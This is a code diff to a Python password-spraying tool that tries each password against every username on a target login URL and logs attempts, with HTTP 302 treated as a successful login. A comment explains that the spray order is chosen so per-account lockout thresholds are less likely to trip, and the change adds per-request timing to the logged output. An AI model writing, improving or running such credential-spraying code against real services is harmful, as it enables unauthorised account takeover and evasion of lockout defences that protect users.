@@ -24,18 +24,18 @@ def main():
         passwords = [line.strip() for line in f if line.strip()]
 
     hits = []
-    start = time.time()
     # Spray order: one known password against every account before moving to
     # the next password, so a per-account failed-attempt threshold is less
     # likely to trip than a per-account dictionary sweep would.
     for password in passwords:
         for username in users:
+            request_start = time.time()
             try:
                 status = try_login(args.url, username, password)
             except Exception as e:
                 status = f"ERROR {e}"
-            elapsed = time.time() - start
-            line = f"[{elapsed:7.3f}s] user={username} password={password!r} -> HTTP {status}"
+            request_elapsed = time.time() - request_start
+            line = f"[{request_elapsed:7.3f}s] user={username} password={password!r} -> HTTP {status}"
             print(line)
             logf.write(line + "\n")
             if status == 302:
